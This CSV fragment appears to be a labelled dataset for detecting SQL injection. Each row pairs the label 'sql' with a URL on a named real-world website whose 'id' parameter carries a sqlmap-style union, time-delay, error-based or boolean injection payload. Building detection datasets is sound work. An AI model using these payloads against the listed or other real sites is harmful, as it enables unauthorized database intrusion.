,language,source"
73,sql,"http : / / dance . vftsarr . ru / index . php ? id = 1 AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) - - VWJB"
74,sql,"http : / / gtrkchita . ru / listen . php ? id = 1 AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) - - VWJB"
75,sql,"https : / / learnzone . org . uk / courses / course . php ? id = 1 AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) - - sFCM"
76,sql,"http : / / www . jannahplace . com / hotels . php ? id = 1 ' ) WAITFOR DELAY ' 0 : 0 : 5 ' AND ( ' RIHg ' = ' RIHg"
77,sql,"http : / / www . rgcms . edu . in / research . php ? id = 1 ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( 2513 = 2513"
78,sql,"http : / / www . nordicbook . ru / index . php ? id = ( SELECT ( CASE WHEN ( 3684 = 3684 ) THEN 3684 ELSE 3684* ( SELECT 3684 FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
79,sql,"https : / / vstomp . hotoneaudio . com / ProductsDetail . php ? id = 1;SELECT PG_SLEEP ( 5 ) - - "
81,sql,"http : / / www . strail . de / index . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - sBcc"
82,sql,"http : / / www . ohmsghana . com / pages / services . php ? id = 1 % ' ;WAITFOR DELAY ' 0 : 0 : 5 ' - - "
83,sql,"http : / / www . kvm . co . ke / products . php ? id = 1 ' UNION ALL SELECT NULL - - lmXC"
84,sql,"http : / / www . professor - butakov . ru / history / view_history . php ? id = 1 ) UNION ALL SELECT NULL , NULL - - EXrh"
85,sql,"http : / / www . indembassy . be / pages . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - rjiF"
86,sql,"http : / / www . smtmax . com / category . php ? id = 1 ) AND SLEEP ( 5 ) AND ( 7824 = 7824"
87,sql,"http : / / www . mirraketok . ru / subs . php ? id = 1 % ' AND SLEEP ( 5 ) AND ' % ' = ' "
88,sql,"http : / / www . arion . ru / template . php ? id = 1 % ' AND 3611 = 3611 AND ' % ' = ' "
89,sql,"http : / / www . myappterms . com / reader . php ? id = 1 ) AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ( 4586 = 4586"
90,sql,"http : / / www . ictet . org / list % 2Bmember . php ? id = 1 ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - Cgcm"
92,sql,"http : / / www . unifr . ch / form / iaupe_32 / view . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - Dvxx"
93,sql,"http : / / www . millennium - tech . net / serviceInfo . php ? id = 1 ' ) AND 7457 = 2191 AND ( ' iHjE ' = ' iHjE"
94,sql,"http : / / www . jdcaravan . com / store . php ? id = 1 AND 2076 = 1452 - - zXSW"
95,sql,"https : / / www . nationaloil . co . ke / site / 2 . php ? id = 1 % ' ;SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 84 ) | | CHR ( 106 ) | | CHR ( 102 ) | | CHR ( 83 ) , 5 ) FROM DUAL - - "
96,sql,"https : / / www . crocodile . com . hk / en / webpage . php ? id = 1 ) ORDER BY 1 - - zRhc"
97,sql,"http : / / www . icona . info / content . php ? id = 1 ' ) AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ( ' VgiB ' = ' VgiB"
98,sql,"http : / / www1 . clermont . inra . fr / wq / index . php ? id = 1 ' ) AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ' DVsm ' = ' DVsm"
99,sql,"http : / / www . shorttrackonline . info / web - tv . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - PViD"
101,sql,"http : / / safring . adu . org . za / content . php ? id = 1 ' AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' JKvn ' = ' JKvn"
102,sql,"http : / / www . phpsimplicity . com / tips . php ? id = 1 ) AND 3611 = 3611 AND ( 5554 = 5554"
104,sql,"https : / / ticketpay . jp / support_page . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL - - atbf"
105,sql,"https : / / www . aaaauto . eu / en / users . php ? id = 1 ' ) AND 3611 = 3611 AND ( ' xpHU ' = ' xpHU"
106,sql,"http : / / www . mvpvo . ru / inner . php ? id = 1 % ' UNION ALL SELECT NULL - - rJyU"
108,sql,"https : / / www . law . cuhk . edu . hk / en / people / info . php ? id = 1 ' ;WAITFOR DELAY ' 0 : 0 : 5 ' - - "
110,sql,"https : / / www . cmu . ac . th / en / engaboutcmu . php ? id = 1 % ' AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ' % ' = ' "
111,sql,"https : / / www . indianembassythimphu . bt / pages . php ? id = 1 ORDER BY 1 - - lAea"
114,sql,"https : / / www . tonfly . com / helmet . php ? id = 1 AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) "
115,sql,"http : / / www . polosub . com / scheda_mute_en . php ? id = 1 ' NKZqCS< ' ">bIRAbA"
116,sql,"https : / / xn - - 80aaejurlecbd2k8c . xn - - p1ai / index . php ? id = ( SELECT ( CASE WHEN ( 9362 = 8798 ) THEN 9362 ELSE 9362* ( SELECT 9362 FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
117,sql,"http : / / www . sinohytec . com / en / page . php ? id = 1 ' ) AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ( ' eWKx ' = ' eWKx"
118,sql,"https : / / friendsofscience . org / index . php ? id = ( SELECT CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 5838 = 5838 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) "
119,sql,"http : / / www . blessgans . de / index . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - IKMj"
120,sql,"http : / / www . zentrumexil . at / index . php ? id = 1 ' AND SLEEP ( 5 ) AND ' itCe ' = ' itCe"
121,sql,"https : / / www . laboshop . com / index . php ? id = 1 % ' ;WAITFOR DELAY ' 0 : 0 : 5 ' - - "
122,sql,"http : / / www . stalmax . com / index . php ? id = 1 AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) "
123,sql,"https : / / rational . org / index . php ? id = 1 UNION ALL SELECT NULL , NULL - - ctvb"
124,sql,"https : / / library . geraldika . ru / book . php ? id = 1 AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) - - sFCM"
125,sql,"http : / / www . redtory . com . cn / english / about . php ? id = 1 ' AND 7019 = 2399 AND ' bmfB ' = ' bmfB"
126,sql,"http : / / www . innofader . com / products . php ? id = 1 AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) "
127,sql,"http : / / www . freescience . info / books . php ? id = 1 ) UNION ALL SELECT NULL , NULL - - EXrh"
128,sql,"http : / / www . treeviewthai . com / service_en . php ? id = 1 ORDER BY 1 - - lAea"
129,sql,"http : / / www . ghanatimber . org / certification_details . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) "
131,sql,"http : / / venusita - moda . com / article . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - itKr"
132,sql,"http : / / byglearning . co . uk / mrcrsc - lms / course / category . php ? id = 1 ) ORDER BY 1 - - zRhc"
133,sql,"http : / / www . mcdonalds . co . jp / quality / allergy_Nutrition / nutrient2 . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - itKr"
